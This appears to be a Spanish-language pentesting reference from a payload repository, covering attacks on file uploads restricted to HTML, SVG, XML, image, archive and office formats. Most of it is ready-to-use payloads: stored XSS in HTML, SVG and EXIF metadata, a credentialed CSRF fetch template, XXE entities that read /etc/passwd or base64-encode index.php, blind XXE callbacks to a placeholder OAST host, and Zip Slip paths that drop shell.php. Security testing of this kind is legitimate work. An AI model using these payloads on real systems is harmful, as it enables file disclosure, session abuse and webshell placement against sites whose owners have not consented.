# 08 - Payloads para uploads limitados

## Objetivo

Organizar payloads y notas para escenarios donde **no puedes subir una extensión ejecutable**, pero la aplicación permite formatos con impacto potencial.

```text
Upload arbitrario  → intentar handler ejecutable
Upload limitado    → abusar del formato permitido o del parser que lo consume
```

Esto complementa el fuzzing de filenames. Aquí la pregunta no es solo “¿puedo subir `.php`?”, sino:

```text
Si solo puedo subir .html/.svg/.xml/.jpg/.zip/.pdf, ¿qué impacto puedo probar?
```

---

## Ruta recomendada

```text
wordlists/content/limited_upload/
```

Estructura sugerida:

```text
limited_upload/
├── html/
├── svg/
├── xml/
├── metadata/
├── archives/
├── documents/
└── dos/
```

---

## Matriz de decisión

| Tipo permitido | Ataque posible | Condición necesaria | Carpeta |
|---|---|---|---|
| `.html` | Stored XSS / CSRF chaining | HTML accesible same-origin | `html/` |
| `.svg` | Stored XSS | SVG renderizado inline | `svg/` |
| `.svg` / `.xml` | XXE | Parser XML inseguro | `svg/`, `xml/` |
| `.svg` / `.xml` | SSRF vía XXE | Entidades externas permitidas | `svg/`, `xml/` |
| `.jpg` / `.png` | XSS en metadata | EXIF mostrado sin escapar | `metadata/` |
| `.zip` / `.tar` | Zip Slip | Paths internos no normalizados | `archives/` |
| `.pdf` / `.docx` / `.xlsx` | Parser abuse / XXE ideas | Viewer o conversor backend | `documents/` |
| Archivos grandes | DoS controlado | Límites débiles | `dos/` |

---

# 1. HTML permitido

## Cuándo tiene sentido

```text
[ ] La app permite .html o .htm.
[ ] El archivo queda accesible por URL.
[ ] Se sirve desde el mismo origen de la app.
[ ] No fuerza Content-Disposition: attachment.
[ ] No hay CSP que bloquee scripts inline.
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/html/stored_xss_basic.html
wordlists/content/limited_upload/html/csrf_chain_template.html
```

## `stored_xss_basic.html`

```html
<!doctype html>
<html>
  <body>
    <script>alert(window.origin)</script>
  </body>
</html>
```

Señal:

```text
JS ejecutado en el origen de la aplicación.
```

## `csrf_chain_template.html`

```html
<!doctype html>
<html>
  <body>
    <script>
      /* Cambiar endpoint, método y body según el lab */
      fetch('/CHANGE_ME_ENDPOINT', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'param=value'
      });
    </script>
  </body>
</html>
```

Modelo mental:

```text
HTML upload → Stored XSS → requests autenticadas con cookies de la víctima
```

---

# 2. SVG permitido

SVG es delicado porque vive en dos mundos:

```text
SVG servido al navegador       → XSS
SVG parseado en backend XML    → XXE / SSRF
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/svg/svg_xss_onload.svg
wordlists/content/limited_upload/svg/svg_xss_script.svg
wordlists/content/limited_upload/svg/svg_xxe_file_read.svg
wordlists/content/limited_upload/svg/svg_xxe_php_filter.svg
wordlists/content/limited_upload/svg/svg_xxe_oast_callback.svg
```

## `svg_xss_onload.svg`

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin)"/>
```

## `svg_xss_script.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <script>alert(window.origin)</script>
</svg>
```

## `svg_xxe_file_read.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## `svg_xxe_php_filter.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## `svg_xxe_oast_callback.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://CHANGE_ME.oast.site/svg_xxe">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## Señales de éxito

| Vector | Señal |
|---|---|
| SVG XSS | `alert(window.origin)` o JS ejecutado |
| SVG XXE file read | contenido local en respuesta/source |
| SVG XXE PHP filter | base64 del código fuente |
| SVG XXE blind | DNS/HTTP callback |
| SSRF vía XXE | callback o respuesta diferencial |

## Matiz importante

No todos los contextos ejecutan SVG igual:

| Contexto | Comentario |
|---|---|
| Acceso directo al `.svg` | Mejor prueba para XSS inline |
| `<iframe src="file.svg">` | Puede ejecutar, depende de CSP/sandbox |
| `<object data="file.svg">` | Puede ejecutar |
| `<img src="file.svg">` | Normalmente no ejecuta `<script>` |
| CSS background | Normalmente no ejecuta JS |

---

# 3. XML permitido

## Cuándo tiene sentido

```text
[ ] La app permite .xml.
[ ] La app parsea o muestra contenido XML.
[ ] Hay importación/exportación XML.
[ ] Se generan errores XML o previews.
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/xml/xxe_file_read.xml
wordlists/content/limited_upload/xml/xxe_php_filter.xml
wordlists/content/limited_upload/xml/xxe_oast_callback.xml
```

## `xxe_file_read.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## `xxe_php_filter.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

## `xxe_oast_callback.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://CHANGE_ME.oast.site/xml_xxe">
]>
<root>&xxe;</root>
```

---

# 4. JPG/PNG metadata

## Cuándo tiene sentido

```text
[ ] La app extrae metadata EXIF.
[ ] La app muestra Comment/Artist/UserComment/etc.
[ ] La metadata se inserta en HTML.
[ ] No hay escaping correcto.
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/metadata/exif_fields.txt
wordlists/content/limited_upload/metadata/exif_xss_payloads.txt
wordlists/content/limited_upload/metadata/exiftool_examples.md
```

## `exif_fields.txt`

```text
Comment
Artist
ImageDescription
UserComment
XPComment
XPTitle
XPAuthor
Copyright
```

## `exif_xss_payloads.txt`

```text
"><img src=x onerror=alert(window.origin)>
"><svg/onload=alert(window.origin)>
<script>alert(window.origin)</script>
```

## `exiftool_examples.md`

```bash
exiftool -Comment='"><img src=x onerror=alert(window.origin)>' image.jpg
exiftool -Artist='"><svg/onload=alert(window.origin)>' image.jpg
exiftool image.jpg
```

## Señal

```text
El payload se renderiza como HTML/JS, no como texto escapado.
```

---

# 5. ZIP/TAR archives

## Cuándo tiene sentido

```text
[ ] La app acepta .zip, .tar, .tar.gz.
[ ] El backend descomprime automáticamente.
[ ] Se conservan paths internos.
[ ] La extracción no normaliza rutas.
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/archives/zip_slip_paths.txt
wordlists/content/limited_upload/archives/tar_slip_paths.txt
wordlists/content/limited_upload/archives/archive_notes.md
```

## `zip_slip_paths.txt`

```text
../shell.php
../../shell.php
../../../shell.php
../public/shell.php
../../public/shell.php
../uploads/shell.php
../../uploads/shell.php
../profile_images/shell.php
../../profile_images/shell.php
```

## Objetivo

Estos ficheros no son ZIPs completos. Son nombres internos para construir archivos de prueba.

Señales conceptuales:

```text
[ ] escritura fuera del directorio de extracción
[ ] overwrite de archivo existente
[ ] path disclosure
[ ] archivo accesible fuera de carpeta esperada
```

---

# 6. PDF / Office documents

## Cuándo tiene sentido

```text
[ ] La app acepta PDF/DOCX/XLSX/PPTX.
[ ] El backend genera preview.
[ ] El backend convierte documentos.
[ ] Hay un viewer server-side.
```

## Ficheros sugeridos

```text
wordlists/content/limited_upload/documents/office_xxe_notes.md
wordlists/content/limited_upload/documents/pdf_parser_notes.md
```

## Ideas documentadas

```text
[ ] DOCX/XLSX/PPTX son ZIPs con XML interno.
[ ] Revisar relaciones externas.
[ ] Revisar callbacks HTTP/DNS.
[ ] Revisar parsers que resuelvan recursos remotos.
[ ] Revisar errores diferenciales del viewer.
```

No metería payloads DOCX/PDF complejos como primer nivel del repo. Mejor dejar notas y plantillas.

---

# 7. DoS controlado

## Importante

No incluir bombs destructivas listas para ejecutar en el repo.

## Fichero sugerido

```text
wordlists/content/limited_upload/dos/dos_safe_test_notes.md
```

## Pruebas seguras documentables

```text
[ ] archivo vacío
[ ] archivo de 1 byte
[ ] archivo justo por debajo del límite
[ ] archivo justo por encima del límite
[ ] muchas entradas pequeñas en ZIP, sin bomb real
[ ] imagen grande controlada en entorno de laboratorio
```

## Señales

```text
[ ] timeout
[ ] 500
[ ] crash de worker
[ ] lentitud al procesar thumbnails
[ ] consumo anómalo de memoria/CPU
```

---

## Resumen rápido

| Si permiten... | Mira primero... |
|---|---|
| `.html` | `limited_upload/html/stored_xss_basic.html` |
| `.svg` | `svg_xss_onload.svg`, `svg_xxe_oast_callback.svg` |
| `.xml` | `xxe_oast_callback.xml`, `xxe_file_read.xml` |
| `.jpg/.png` | `metadata/exiftool_examples.md` |
| `.zip/.tar` | `archives/zip_slip_paths.txt` |
| `.pdf/.docx/.xlsx` | `documents/*_notes.md` |
| archivos grandes | `dos/dos_safe_test_notes.md` |
